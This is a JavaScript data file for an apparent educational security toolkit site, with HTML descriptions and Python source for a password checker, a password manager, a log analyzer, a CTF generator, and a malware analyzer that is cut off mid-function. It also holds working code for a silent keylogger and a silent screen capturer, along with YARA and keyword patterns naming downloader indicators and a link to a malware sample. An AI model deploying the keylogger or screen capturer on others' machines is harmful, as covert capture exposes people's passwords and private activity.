const questions = {
    intro:{
      title: "Introduciton",
      description: ` <h2>Welcome to Your Security Toolkit</h2>
    <p>This platform provides essential cybersecurity tools to help protect your digital assets and maintain system integrity.</p>
  </div>

  <div class="intro-section">
    <h2>Key Features</h2>
    <ul>
      <li><strong>Password Tools:</strong> Check strength and manage credentials</li>
      <li><strong>System Monitoring:</strong> Track activities and detect anomalies</li>
      <li><strong>Security Analysis:</strong> Audit logs and verify file integrity</li>
      <li><strong>Forensic Utilities:</strong> Investigate and analyze system data</li>
    </ul>
  </div>

  <div class="intro-section">
    <h2>Getting Started</h2>
    <p>Select any tool from the left menu to begin. Each tool includes instructions for use.</p>
    <p>For best results, use this platform in a controlled testing environment.</p>
  </div>

  <div class="disclaimer">
    <p><i class="fas fa-exclamation-triangle"></i> <strong>Note:</strong> These tools are for educational and authorized security testing purposes only.</p>
    `

    },
    password_strength: {
    title: "Password Strength Checker",
    description: `<div class="section">
    <h3>How This Tool Works</h3>
    <p>This tool evaluates password strength using mathematical entropy calculations combined with common password checks.</p>
    
    <div class="algorithm-steps">
      <h4>Key Steps in the Analysis:</h4>
      <Ul>
        <li><strong>Character Pool Analysis:</strong>
          <ul>
            <li>Checks for lowercase letters (a-z) - adds 26 to pool</li>
            <li>Checks for uppercase letters (A-Z) - adds 26 to pool</li>
            <li>Checks for digits (0-9) - adds 10 to pool</li>
            <li>Checks for special characters - adds 32 to pool</li>
          </ul>
        </li>
        <li><strong>Entropy Calculation:</strong>
          <p>Uses the formula: <code>log2(pool_size ^ password_length)</code></p>
          <p>This measures the theoretical difficulty of brute-forcing the password</p>
        </li>
        <li><strong>Common Password Check:</strong>
          <p>Compares against known weak passwords like "password123"</p>
        </li>
      </Ul>
    </div>
  </div>

  <div class="section">
    <h3>Strength Rating Scale</h3>
    <table class="strength-table">
      <tr>
        <th>Entropy Value</th>
        <th>Rating</th>
        <th>Description</th>
      </tr>
      <tr>
        <td>&lt; 28 bits</td>
        <td>⚠️ Weak</td>
        <td>Can be cracked almost instantly</td>
      </tr>
      <tr>
        <td>28-35 bits</td>
        <td>🟡 Moderate</td>
        <td>Vulnerable to brute force attacks</td>
      </tr>
      <tr>
        <td>36-59 bits</td>
        <td>✅ Strong</td>
        <td>Resistant to most attacks</td>
      </tr>
      <tr>
        <td>60+ bits</td>
        <td>🔒 Very Strong</td>
        <td>Extremely difficult to crack</td>
      </tr>
    </table>
  </div>

  <div class="section">
    <h3>Tips for Strong Passwords</h3>
    <ul class="tips-list">
      <li>Use at least 12 characters</li>
      <li>Combine letters (upper and lower case), numbers, and symbols</li>
      <li>Avoid dictionary words and common phrases</li>
      <li>Don't use personal information</li>
      <li>Consider using a passphrase (e.g., "CorrectHorseBatteryStaple")</li>
    </ul>
  </div>

  <div class="limitations">
    <h3>Tool Limitations</h3>
    <p>While this tool provides a good estimate, note that:</p>
    <ul>
      <li>It doesn't check password breaches/databases</li>
      <li>Advanced attackers may use sophisticated techniques beyond brute force</li>
      <li>Pattern-based passwords (like "ABC123!@#") may score higher than they should</li>
    </ul>
  </div>
  <h4>🎥 Demo Video:</h4>
    <video width="100%" controls>
    <source src="/static/password_strength.mp4" type="video/mp4">
    Your browser does not support the video tag.
    </video>`,
    code: `
# Import necessary libraries
import re               # For regular expression matching
import math             # For entropy calculation (logarithms)
import tkinter as tk    # GUI creation
from tkinter import messagebox  # (Optional) For popup messages

# Function to check password strength
def password_strength(password):
    pool = 0  # Initialize character pool size

    # Check for lowercase letters
    if re.search(r'[a-z]', password):
        pool += 26  # 26 lowercase letters

    # Check for uppercase letters
    if re.search(r'[A-Z]', password):
        pool += 26  # 26 uppercase letters

    # Check for digits (0-9)
    if re.search(r'\d', password):  # Corrected regex for digits
        pool += 10  # 10 digits

    # Check for special characters
    if re.search(r'[^a-zA-Z0-9]', password):
        pool += 32  # Approximate number of common special characters

    # If pool is still 0, password has no recognizable characters
    if pool == 0:
        return "⚠️ Invalid (no recognizable characters)"
    
    # Calculate entropy using Shannon's formula
    # Higher entropy = stronger password
    entropy = math.log2(pool ** len(password)) if len(password) > 0 else 0

    # List of weak/common passwords
    weak_passwords = ["password", "123456", "qwerty", "letmein"]

    # Check against common weak passwords
    if password.lower() in weak_passwords:
        return "❌ Extremely weak (Common password)"

    # Rate password based on entropy value
    if entropy < 28:
        return "⚠️ Weak (easily brute-forced)"
    elif entropy < 36:
        return "🟡 Moderate"
    elif entropy < 60:
        return "✅ Strong"
    else:
        return "🔒 Very strong (resistant to attacks)"

# This function is called when the "Check Strength" button is clicked
def check_password():
    pwd = entry.get()  # Get password from input field
    result = password_strength(pwd)  # Get strength rating
    result_label.config(text=result)  # Display result in label

# ========================
# Tkinter GUI Starts Here
# ========================

# Create main window
root = tk.Tk()
root.title("Password Strength Checker")  # Set window title
root.geometry("400x250")                # Set window size
root.config(bg="#1e1e1e")               # Set background color (dark mode)

# Instruction label
label = tk.Label(root, text="Enter your password:", font=("Segoe UI", 12), fg="white", bg="#1e1e1e")
label.pack(pady=10)

# Entry field for password (masked with *)
entry = tk.Entry(root, show="*", font=("Segoe UI", 12), width=30)
entry.pack(pady=5)

# Button to trigger password check
btn = tk.Button(root, text="Check Strength", command=check_password,
                font=("Segoe UI", 12), bg="#4caf50", fg="white")
btn.pack(pady=15)

# Label to display the strength result
result_label = tk.Label(root, text="", font=("Segoe UI", 14, "bold"), fg="cyan", bg="#1e1e1e")
result_label.pack(pady=10)

# Start the GUI loop
root.mainloop()
`
  },
  password_manager: {
    title: "Password Manager",
    description: `<h4>🔐 GUI-Based Encrypted Password Manager (with SQLite + Fernet Encryption)</h4>
      <p>
      This Python project is a <strong>secure, minimal, and user-friendly password manager</strong>, built with the power of 
      <em>Tkinter</em> for its interface, <em>SQLite</em> for local storage, and <em>Fernet</em> (from the <code>cryptography</code> 
      module) for AES-128 based symmetric encryption.
    </p>
  
    <h4>🛡️ Key Features:</h4>
    <ul>
      <li>🔐 <strong>Password Encryption:</strong> Every password is encrypted before being stored, using a unique Fernet key generated and saved in <code>secret.key</code>.</li>
      <li>🧠 <strong>Memory-Safe Retrieval:</strong> Passwords can only be decrypted and viewed when requested through the interface using the matching email.</li>
      <li>🧬 <strong>Strong Password Generator:</strong> Generates complex 16-character passwords using <code>secrets</code> and <code>string</code> modules for high entropy.</li>
      <li>💾 <strong>Local Storage with SQLite:</strong> Stores service, email, username, and the encrypted password in a lightweight and persistent database.</li>
      <li>⚙️ <strong>Error Handling & Alerts:</strong> Friendly <code>messagebox</code> popups guide the user, whether inputs are missing or data is retrieved successfully.</li>
    </ul>
    <h4>🎥 Demo Video:</h4>
    <video width="100%" controls>
    <source src="/static/pm.mp4" type="video/mp4">
    Your browser does not support the video tag.
    </video>`,
    code: `
# Import required libraries
import tkinter as tk  # GUI toolkit
from tkinter import messagebox  # Dialog boxes
import sqlite3  # Database operations
import secrets  # Cryptographically secure random numbers
import string  # String operations
from cryptography.fernet import Fernet  # Encryption/decryption

# Encryption key handling functions
def generate_key():
    """Generate a new encryption key and save to file"""
    key = Fernet.generate_key()  # Generate 256-bit AES key
    with open("secret.key", "wb") as key_file:
        key_file.write(key)

def load_key():
    """Load the encryption key from file"""
    return open("secret.key", "rb").read()

# Initialize encryption system
try:
    key = load_key()  # Try to load existing key
except FileNotFoundError:
    generate_key()  # Create new key if none exists
    key = load_key()

cipher = Fernet(key)  # Create cipher suite with our key

# Database setup
conn = sqlite3.connect('password_manager.db')  # Create/connect to database
cursor = conn.cursor()
# Create passwords table if it doesn't exist
cursor.execute('''CREATE TABLE IF NOT EXISTS passwords (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    service TEXT NOT NULL,  
    email TEXT NOT NULL,    
    username TEXT NOT NULL, 
    password TEXT NOT NULL 
)''')
conn.commit()
conn.close()

# Password encryption/decryption functions
def encrypt_password(password):
    """Encrypt a password using Fernet symmetric encryption"""
    return cipher.encrypt(password.encode()).decode()  # Convert to bytes, encrypt, then back to string

def decrypt_password(encrypted_password):
    """Decrypt an encrypted password"""
    return cipher.decrypt(encrypted_password.encode()).decode()  # Reverse of encryption

# Core application functions
def store_password():
    """Store a new password entry in the database"""
    # Get values from GUI fields
    service = service_entry.get()
    email = email_entry.get()
    username = username_entry.get()
    password = password_entry.get()

    # Validate all fields are filled
    if not service or not email or not username or not password:
        messagebox.showwarning("Error", "All fields are required!")
        return

    # Encrypt the password before storage
    encrypted_pw = encrypt_password(password)
    
    # Database operations
    conn = sqlite3.connect('password_manager.db')
    cursor = conn.cursor()
    # Insert the new record
    cursor.execute("INSERT INTO passwords (service, email, username, password) VALUES (?, ?, ?, ?)",
                   (service, email, username, encrypted_pw))
    conn.commit()
    conn.close()
    messagebox.showinfo("Success", "Password stored securely!")

def get_password():
    """Retrieve a password from the database by email"""
    email = email_entry.get()
    if not email:
        messagebox.showwarning("Error", "Email field is required!")
        return

    conn = sqlite3.connect('password_manager.db')
    cursor = conn.cursor()
    # Find password record by email
    cursor.execute("SELECT service, username, password FROM passwords WHERE email=?", (email,))
    result = cursor.fetchone()  # Get first matching record
    conn.close()

    if result:
        service, username, encrypted_pw = result
        decrypted_pw = decrypt_password(encrypted_pw)  # Decrypt for display
        messagebox.showinfo("Retrieved", f"""Service: {service}\nUsername: {username}\nPassword: {decrypted_pw}""")
    else:
        messagebox.showwarning("Not Found", "No password found for this email.")

def generate_password():
    """Generate a strong random password"""
    # Create character set: letters (upper/lower), digits, and punctuation
    chars = string.ascii_letters + string.digits + string.punctuation
    # Generate 16-character password using cryptographically secure random choices
    password = ''.join(secrets.choice(chars) for _ in range(16))
    # Update the password field in the GUI
    password_entry.delete(0, tk.END)
    password_entry.insert(0, password)

# GUI Setup
root = tk.Tk()
root.title("🔐 Password Manager")
root.geometry("700x600")

# Create and place labels
tk.Label(root, text="Service:").grid(row=0, column=0, padx=10, pady=5)
tk.Label(root, text="Email:").grid(row=1, column=0, padx=10, pady=5)
tk.Label(root, text="Username:").grid(row=2, column=0, padx=10, pady=5)
tk.Label(root, text="Password:").grid(row=3, column=0, padx=10, pady=5)

# Create and place input fields
service_entry = tk.Entry(root, width=30)
service_entry.grid(row=0, column=1, padx=10, pady=5)
email_entry = tk.Entry(root, width=30)
email_entry.grid(row=1, column=1, padx=10, pady=5)
username_entry = tk.Entry(root, width=30)
username_entry.grid(row=2, column=1, padx=10, pady=5)
password_entry = tk.Entry(root, width=30)
password_entry.grid(row=3, column=1, padx=10, pady=5)

# Create and place buttons
tk.Button(root, text="Store Password", command=store_password).grid(row=4, column=0, columnspan=2, pady=10)
tk.Button(root, text="Retrieve Password", command=get_password).grid(row=5, column=0, columnspan=2, pady=5)
tk.Button(root, text="Generate Password", command=generate_password).grid(row=6, column=0, columnspan=2, pady=5)

# Start the GUI event loop
root.mainloop()

    `
  },
  silent_screen_monitor: {
    title: " Silent Screen Monitor ",
      description: `<h4>🖥️ Silent Screen Monitoring Tool (Python-Based)</h4>
      <p>This script is a lightweight, silent screen capture utility written in Python. It automatically takes screenshots of your screen every minute and saves them in a neatly organized folder with a timestamped name for easy tracking.</p>
      
      <h4>🔧 Key Features:</h4>
      <ul>
        <li><strong>Automated Screenshots:</strong> Captures your screen silently every 60 seconds.</li>
        <li><strong>Organized Output:</strong> Saves each screenshot with a timestamped filename inside a uniquely named folder.</li>
        <li><strong>Cross-Platform:</strong> Works on most platforms where Python and pyautogui are supported.</li>
        <li><strong>Graceful Exit:</strong> Press Ctrl + C anytime to stop the monitoring process cleanly.</li>
      </ul>
      
      <h4>📂 Use Cases:</h4>
      <ul>
        <li>Parental or self-monitoring tool during study or work hours.</li>
        <li>Low-resource activity logger.</li>
        <li>Background screen tracking during software testing or presentations.</li>
      </ul>
      <h4>🎥 Demo Video:</h4>
    <video width="100%" controls>
    <source src="/static/screen.mp4" type="video/mp4">
    Your browser does not support the video tag.
    </video>`,
      code: `
# Import required libraries
import pyautogui  # For taking screenshots
import os         # For file/folder operations
import time       # For time-related functions
from datetime import datetime  # For timestamp handling

# Create a dedicated folder for screenshots with current timestamp
# Format: Screenshots_YYYYMMDD_HHMMSS (e.g., Screenshots_20231225_143022)
folder_name = datetime.now().strftime("Screenshots_%Y%m%d_%H%M%S")
os.makedirs(folder_name, exist_ok=True)  # Create folder if it doesn't exist

# Set capture interval (in seconds) - currently set to 1 minute
interval = 60

print("[*] Silent screen monitoring started... (1 screenshot per minute)")
print(f"[*] Screenshots saving to: {os.path.abspath(folder_name)}")

try:
    # Main monitoring loop
    while True:
        # Generate timestamp for filename (YYYY-MM-DD_HH-MM-SS format)
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        
        # Create full file path for the screenshot
        file_path = os.path.join(folder_name, f"screenshot_{timestamp}.png")
        
        # Capture the screen
        screenshot = pyautogui.screenshot()
        
        # Save the screenshot to file
        screenshot.save(file_path)
        print(f"[+] Captured: {file_path}")  # Optional logging
        
        # Wait for the specified interval before next capture
        time.sleep(interval)

except KeyboardInterrupt:
    # Handle user interruption (Ctrl+C)
    print("[!] Monitoring stopped by user.")
    print(f"[*] Screenshots saved in: {os.path.abspath(folder_name)}")`
  },
  log_analyzer:{
    title: "Log Analyzer",
    description: `<h4>🔍 What does the Log Analyzer do?</h4>
    <ul>
      <li>Opens a .log file chosen by the user</li>
      <li>Reads each line and checks if it contains:
        <ul>
          <li><strong>ERROR</strong> ➜ Increases error count</li>
          <li><strong>WARNING</strong> ➜ Increases warning count</li>
          <li><strong>INFO</strong> ➜ Increases info count</li>
        </ul>
      </li>
      <li>Searches for a keyword entered by the user (like "USB", "internet") and highlights matching lines</li>
      <li>Displays all matching logs and shows a summary: total Errors, Warnings, and Info</li>
    </ul>
    
    <h4>🧰 Libraries Used</h4>
    <p>All are built-in, no installation needed:</p>
    <ul class="library-list">
      <li><strong>tkinter</strong> – For GUI</li>
      <li><strong>filedialog</strong> – For selecting the file</li>
      <li><strong>messagebox</strong> – To show errors if something breaks</li>
      <li><strong>re</strong> – For keyword matching (basic use here)</li>
      <li><strong>datetime</strong> – For handling timestamps (if needed later)</li>
    </ul>
    <h4>Download test file:</h4>
    <p><a href="static/test_logs.log" download>⬇️ Download log sample file</a></p>
    <h4>🎥 Demo Video:</h4>
    <video width="100%" controls>
    <source src="/static/log.mp4" type="video/mp4">
    Your browser does not support the video tag.
    </video>`,
    code: `
import tkinter as tk
from tkinter import filedialog, messagebox
import re
from datetime import datetime


def open_file():
    file_path = filedialog.askopenfilename(filetypes=[("Text files", "*.log"), ("All files", "*.*")])
    if file_path:
        file_name.set(file_path)
        analyze_log(file_path)
def analyze_log(file_path):
    try:
        with open(file_path, 'r') as f:
            logs = f.readlines()

        error_count = 0
        warning_count = 0
        info_count = 0
        filtered_logs = []
        internet_detected = False
        usb_detected = False
        keyword = keyword_entry.get().strip()

        for log in logs:
            timestamp = log.split(" ")[0]

            # Count log types
            if "ERROR" in log:
                error_count += 1
                filtered_logs.append(f"{timestamp} - {log.strip()}")
            elif "WARNING" in log:
                warning_count += 1
                filtered_logs.append(f"{timestamp} - {log.strip()}")
            elif "INFO" in log:
                info_count += 1
                filtered_logs.append(f"{timestamp} - {log.strip()}")

            # Keyword search
            if keyword and keyword.lower() in log.lower():
                filtered_logs.append(f"[Keyword Found] {log.strip()}")

            # Internet detection keywords
            if re.search(r"(connected to internet|gateway|dns|network connected|ip address)", log, re.IGNORECASE):
                internet_detected = True
                filtered_logs.append(f"[⚠️ Internet Detected] {log.strip()}")

            # USB detection keywords
            if re.search(r"(usb device|removable|drive letter|new device)", log, re.IGNORECASE):
                usb_detected = True
                filtered_logs.append(f"[💾 USB Detected] {log.strip()}")

        result_text.delete(1.0, tk.END)
        result_text.insert(tk.END," ".join(filtered_logs))

        summary = f"Errors: {error_count}, Warnings: {warning_count}, Info: {info_count}"
        if internet_detected:
            summary += " | ⚠️ System connected to Internet!"
        if usb_detected:
            summary += " | 💾 USB connection detected!"
        summary_label.config(text=summary)

    except Exception as e:
        messagebox.showerror("Error", f"Log analysis failed: {str(e)}")

root = tk.Tk()
root.title("🧑‍💻 Offline Log Analyzer Tool")
root.geometry("700x500")

file_name = tk.StringVar()
tk.Label(root, text="Log File:").pack(pady=5)
tk.Entry(root, textvariable=file_name, width=50, state='readonly').pack(pady=5)
tk.Button(root, text="Browse Log File", command=open_file).pack(pady=10)

tk.Label(root, text="Search for Keyword:").pack(pady=5)
keyword_entry = tk.Entry(root, width=50)
keyword_entry.pack(pady=5)

tk.Label(root, text="Log Analysis Results:").pack(pady=5)
result_text = tk.Text(root, height=15, width=80)
result_text.pack(pady=5)

summary_label = tk.Label(root, text="Errors: 0, Warnings: 0, Info: 0")
summary_label.pack(pady=5)


tk.Button(root, text="Analyze Logs", command=lambda: analyze_log(file_name.get())).pack(pady=10)

root.mainloop()

`
  },
  t5:{
    title:"Key Logger",
    description:`<h4>⌨️ Silent Keylogger (Python-Based)</h4>
    <p>This script is a discreet keyboard activity monitor that logs all keystrokes to a timestamped file, including both regular keys and special keys (like Shift, Ctrl, etc.).</p>
    
    <h4>🔧 Key Features:</h4>
    <ul>
      <li><strong>Automatic Logging:</strong> Records all keyboard input silently in the background</li>
      <li><strong>Timestamped Logs:</strong> Each entry includes the exact time of keypress</li>
      <li><strong>Special Key Detection:</strong> Tracks both character keys and special keys (Ctrl, Alt, etc.)</li>
      <li><strong>Persistent Storage:</strong> Saves logs to a uniquely named text file with date/time</li>
    </ul>
    
    <h4>🧰 Libraries Used:</h4>
    <ul class="library-list">
      <li><strong>pynput.keyboard</strong> – For keyboard monitoring</li>
      <li><strong>logging</strong> – For structured log file output</li>
      <li><strong>datetime</strong> – For timestamp generation</li>
    </ul>
    
    <h4>⚠️ Important Notes:</h4>
    <ul class="warning-list">
      <li>This tool should only be used for <strong>legitimate purposes</strong> with proper consent</li>
      <li>May require admin privileges depending on system configuration</li>
      <li>Press <code>Ctrl+C</code> in terminal to stop the keylogger</li>
    </ul>
    <h4>🎥 Demo Video:</h4>
    <video width="100%" controls>
    <source src="/static/key logger.mp4" type="video/mp4">
    Your browser does not support the video tag.
    </video>`,
    code:`
from pynput import keyboard  # Importing keyboard listener from pynput to capture keystrokes
import logging               # For logging keystrokes into a file
from datetime import datetime  # To timestamp the log file with the current date and time

# Set up logging to a file with a unique timestamp-based filename
log_filename = f"keylog_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"
logging.basicConfig(
    filename=log_filename,       # File to save the keystrokes
    level=logging.DEBUG,         # Log all levels of messages (DEBUG and above)
    format='%(asctime)s: %(message)s'  # Format: timestamp followed by the message
)

# Function to handle each key press event
def on_press(key):
    try:
        # If it's a standard character key, log the actual character
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        # If it's a special key (e.g., Enter, Ctrl), log the key name
        logging.info(f"Special key pressed: {key}")

# Function to start the keylogger
def start_keylogger():
    listener = keyboard.Listener(on_press=on_press)  # Create a listener for keypress events
    listener.start()  # Start the listener in a separate thread (non-blocking)
    print(f"[*] Keylogger started. Logging to {log_filename}")  # Notify user that keylogger has started
    listener.join()   # Keep the main thread alive and wait for the listener thread to complete

# Begin the keylogging process
start_keylogger()
<h4>🎥 Demo Video:</h4>
    <video width="100%" controls>
    <source src="/static/key logger.mp4" type="video/mp4">
    Your browser does not support the video tag.
    </video>
`
 },
 t6:{
  title:"CTF",
  description:`
    <h4>🎯 Offline CTF Challenge Generator (Multi-Encoding)</h4>
    <p>This tool generates random Capture The Flag (CTF) challenges with flags encoded using various encoding schemes, perfect for cybersecurity training and competitions.</p>
    
    <h4>🔧 Key Features:</h4>
    <ul>
      <li><strong>Random Flag Generation:</strong> Creates unique 12-character flags for each challenge</li>
      <li><strong>Multiple Encoding Schemes:</strong> Supports 5 different encoding methods</li>
      <li><strong>Interactive GUI:</strong> Built with Tkinter for easy challenge generation and submission</li>
      <li><strong>Instant Verification:</strong> Automatically checks submitted flags</li>
    </ul>
    
    <h4>🔢 Supported Encoding Methods:</h4>
    <div class="encoding-methods">
      <div class="method">
        <h5>Base64 (Triple Encoded)</h5>
        <p>Encodes the flag using Base64 three times consecutively</p>
      </div>
      <div class="method">
        <h5>ROT13 Cipher</h5>
        <p>Applies the ROT13 letter substitution cipher</p>
      </div>
      <div class="method">
        <h5>Hexadecimal</h5>
        <p>Converts each character to its hexadecimal representation</p>
      </div>
      <div class="method">
        <h5>Binary</h5>
        <p>Converts each character to 8-bit binary</p>
      </div>
      <div class="method">
        <h5>Octal</h5>
        <p>Converts each character to its octal representation</p>
      </div>
    </div>
    
    <h4>🧰 Libraries Used:</h4>
    <ul class="library-list">
      <li><strong>tkinter</strong> - GUI interface</li>
      <li><strong>base64</strong> - Base64 encoding</li>
      <li><strong>random</strong> - Random flag generation</li>
      <li><strong>string</strong> - Character set handling</li>
      <li><strong>binascii</strong> - Hexadecimal encoding</li>
      <li><strong>codecs</strong> - ROT13 implementation</li>
    </ul>
    
    <h4>💡 Usage Instructions:</h4>
    <ul class="library-list">
      <li>Click "Generate New Challenge" to create a random encoded flag</li>
      <li>Decode the challenge using the provided encoding type hint</li>
      <li>Enter your decoded flag in the input box</li>
      <li>Click "Submit Flag" to verify your answer</li>
    </ul>
    <h4>🎥 Demo Video:</h4>
    <video width="100%" controls>
    <source src="/static/ctf.mp4" type="video/mp4">
    Your browser does not support the video tag.
    </video>`,
  code:`
import tkinter as tk                   # GUI library to create windows, buttons, text boxes, etc.
from tkinter import messagebox         # Module to show popup messages
import base64                          # For base64 encoding (used 3 times for extra confusion)
import random                          # To randomly generate flags and encoding types
import string                          # To access letters and digits
import binascii                        # For hex encoding
import codecs                          # For ROT13 encoding

# Function to generate a random flag in the format flag{...}
def generate_flag():
    return f"flag{{{''.join(random.choices(string.ascii_lowercase + string.digits, k=12))}}}"

# Function to encode the flag using Base64 three times
def base64_x3_encode(data):
    encoded = data.encode()  # Convert to bytes
    for _ in range(3):       # Encode 3 times
        encoded = base64.b64encode(encoded)
    return encoded.decode()  # Return as string

# Function to encode using the ROT13 cipher
def rot13_encode(data):
    return codecs.encode(data, 'rot_13')

# Function to encode the flag as hexadecimal
def hex_encode(data):
    return binascii.hexlify(data.encode()).decode()

# Function to convert the flag into binary (8-bit per character)
def binary_encode(data):
    return ' '.join(format(ord(char), '08b') for char in data)

# Function to convert the flag into octal format
def octal_encode(data):
    return ' '.join(format(ord(char), 'o') for char in data)


# The main GUI application class for the CTF challenge
class CTFApp:
    def __init__(self, root):
        self.root = root
        self.root.title("🎯 Offline CTF Challenge Generator (Multi-Encoding)")  # Title of the window
        self.flag = ""           # The actual flag
        self.challenge = ""      # The encoded challenge shown to the user
        self.encoding_type = ""  # The type of encoding used

        # Label for displaying challenge
        tk.Label(root, text="Generated Challenge:", font=("Arial", 12)).pack(pady=5)
        # Text box where the encoded challenge will appear
        self.challenge_box = tk.Text(root, height=5, width=60, wrap=tk.WORD, font=("Courier", 10))
        self.challenge_box.pack(padx=10)

        # Button to generate a new challenge
        tk.Button(root, text="🔁 Generate New Challenge", command=self.generate_challenge, bg="#4CAF50", fg="white").pack(pady=10)

        # Label and input box for user to enter decoded flag
        tk.Label(root, text="🔍 Your Decoded Flag:", font=("Arial", 12)).pack(pady=5)
        self.flag_entry = tk.Entry(root, width=40, font=("Courier", 10))
        self.flag_entry.pack(pady=5)

        # Button to submit and verify the flag
        tk.Button(root, text="✅ Submit Flag", command=self.verify_flag, bg="#2196F3", fg="white").pack(pady=10)

    # Method to generate a new challenge and display it
    def generate_challenge(self):
        self.flag = generate_flag()  # Create a new flag
        self.encoding_type = random.choice(['base64', 'rot13', 'hex', 'binary', 'octal'])  # Randomly pick an encoding

        # Apply the selected encoding
        if self.encoding_type == 'base64':
            self.challenge = base64_x3_encode(self.flag)
            hint = "Hint: Base64 encoded 3 times."
        elif self.encoding_type == 'rot13':
            self.challenge = rot13_encode(self.flag)
            hint = "Hint: ROT13 cipher used."
        elif self.encoding_type == 'hex':
            self.challenge = hex_encode(self.flag)
            hint = "Hint: Hexadecimal encoding."
        elif self.encoding_type == 'binary':
            self.challenge = binary_encode(self.flag)
            hint = "Hint: Binary encoding (8-bit per char)."
        elif self.encoding_type == 'octal':
            self.challenge = octal_encode(self.flag)
            hint = "Hint: Octal encoding."

        # Show the encoded challenge in the text box
        self.challenge_box.delete(1.0, tk.END)
        self.challenge_box.insert(tk.END, self.challenge)
        # Show a popup with encoding info
        messagebox.showinfo("🧩 New Challenge", f"Encoding Type: {self.encoding_type.upper()}\\n{hint}")

    # Method to check the user’s decoded flag against the original
    def verify_flag(self):
        user_input = self.flag_entry.get().strip()
        if user_input == self.flag:
            messagebox.showinfo("🎉 Correct!", "Perfect! You decoded it right!")
        else:
            messagebox.showerror("❌ Wrong!", "Hmm... that's not the correct flag.")


# Launch the application
if __name__ == "__main__":
    root = tk.Tk()               # Create the main window
    root.geometry("650x450")     # Set window size
    app = CTFApp(root)           # Initialize the app
    root.mainloop()              # Run the Tkinter event loop
`
        
},

t7:{
  title:"Malware Detector",
  description:`
 
    <h4>🛡️Malware Analyzer for Small Businesses</h4>
    <p>This tool provides comprehensive malware analysis capabilities with both command-line and GUI interfaces, generating detailed PDF reports of suspicious files.</p>
    
    <h4>🔍 Analysis Features:</h4>
    <div class="analysis-features">
      <div class="feature">
        <h5><i class="fas fa-fingerprint"></i> File Hashing</h5>
        <p>Calculates MD5 and SHA256 hashes for file identification</p>
      </div>
      <div class="feature">
        <h6><i class="fas fa-search"></i> String Extraction</h5>
        <p>Finds suspicious strings (URLs, commands, keywords)</p>
      </div>
      <div class="feature">
        <h5><i class="fas fa-file-code"></i> PE Analysis</h5>
        <p>Examines Portable Executable (PE) file imports</p>
      </div>
      <div class="feature">
        <h5><i class="fas fa-flag"></i> YARA Rules</h5>
        <p>Detects malware patterns using custom YARA rules</p>
      </div>
      <div class="feature">
        <h5><i class="fas fa-file-pdf"></i> PDF Reports</h5>
        <p>Generates professional PDF reports with all findings</p>
      </div>
    </div>
    
    <h4>🧰 Libraries Used:</h4>
    <ul class="library-list">
      <li><strong>hashlib</strong> - File hashing (MD5, SHA256)</li>
      <li><strong>pefile</strong> - PE file analysis</li>
      <li><strong>yara</strong> - Pattern matching</li>
      <li><strong>tkinter</strong> - GUI interface</li>
      <li><strong>fpdf</strong> - PDF report generation</li>
      <li><strong>colorama</strong> - Colored console output</li>
    </ul>
    
    <h4>💻 Usage Modes:</h4>
    <div class="usage-modes">
      <div class="mode">
        <h6><i class="fas fa-terminal"></i> Command Line</h6>
        <p>Run directly from terminal with colored output</p>
        <code>python analyzer.py suspicious_file.exe</code>
      </div>
      <div class="mode">
        <h6><i class="fas fa-window-maximize"></i> Graphical UI</h6>
        <p>User-friendly interface with file picker and results display</p>
      </div>
    </div>
    
    <h4>⚠️ Detection Indicators:</h4>
    <ul class="detection-list">
      <li>Suspicious strings (HTTP, CMD, PowerShell, etc.)</li>
      <li>Malicious DLL imports</li>
      <li>YARA rule matches</li>
      <li>Unusual file characteristics</li>
    </ul>
    <h4>Download test file:</h4>
    <p><a href="static/malware.exe" download>⬇️ Download malware.exe (sample file)</a></p>
    <h4>⚠️ Remeber this file is only for test purpose don't try to run it it may harm your system</h4>
    <h4>🎥 Demo Video:</h4>
    <video width="100%" controls>
    <source src="/static/malware.mp4" type="video/mp4">
    Your browser does not support the video tag.
    </video>`,
  code:`
import hashlib                          # For computing MD5 and SHA256 hashes of the file
import os                               # For file path operations and cleanup
import subprocess                       # To call external ‘strings’ utility for extracting readable text
import pefile                           # To parse Portable Executable (PE) files and inspect imports
import yara                             # To compile and run simple YARA malware-detection rules
import sys                              # For system-specific parameters and functions
from colorama import Fore, Style, init  # To colorize console output for clarity
import tkinter as tk                    # GUI toolkit to build a user-friendly interface
from tkinter import filedialog, messagebox  # To open file dialogs and show pop-up messages

# Initialize colorama so our colored text resets automatically after each print
init(autoreset=True)


def get_file_hashes(filepath):
    """
    ✨ Compute cryptographic hashes to uniquely identify the file.
    - MD5 is fast but less collision-resistant.
    - SHA256 provides stronger integrity checks.
    """
    try:
        with open(filepath, 'rb') as f:
            file_data = f.read()
        md5 = hashlib.md5(file_data).hexdigest()
        sha256 = hashlib.sha256(file_data).hexdigest()
        return md5, sha256
    except Exception as e:
        return None, None


def extract_suspicious_strings(filepath):
    """
    🔍 Run the Unix ‘strings’ command to pull out readable text snippets.
    Then filter for signs like URLs, PowerShell, command snippets, and malware hints.
    """
    try:
        output = subprocess.check_output(['strings', filepath], text=True)
        lines = output.split(' ')
        sus_strings = [
            s for s in lines
            if any(x in s.lower() for x in ['http', 'cmd', 'powershell', '.onion', 'token', 'keylogger'])
        ]
        return sus_strings[:20]
    except Exception as e:
        return [f"Error extracting strings: {str(e)}"]


def analyze_pe_file(filepath):
    """
    🏗️ Parse the PE structure to list imported DLL names.
    Malware often hides behind suspicious libraries.
    """
    try:
        pe = pefile.PE(filepath)
        imports = []
        if hasattr(pe, 'DIRECTORY_ENTRY_IMPORT'):
            for entry in pe.DIRECTORY_ENTRY_IMPORT:
                imports.append(entry.dll.decode('utf-8'))
        return imports
    except Exception as e:
        return [f"Not a PE file or error: {str(e)}"]


def match_yara_rules(filepath):
    """
    🛡️ Write a quick YARA rule, compile it, and scan the file for downloader patterns.
    """
    yara_rule = '''
rule Suspicious_Downloader
{
    meta:
        description = "Detects strings commonly used in downloaders"
    strings:
        $a = "powershell"
        $b = "http://"
        $c = "cmd /c"
        $d = "System.Net.WebClient"
    condition:
        any of them
}
'''
    try:
        import tempfile
        with tempfile.NamedTemporaryFile(delete=False, suffix='.yar') as tmp_rule:
            tmp_rule.write(yara_rule.encode())
            tmp_rule_path = tmp_rule.name

        rules = yara.compile(filepath=tmp_rule_path)
        matches = rules.match(filepath)

        os.remove(tmp_rule_path)
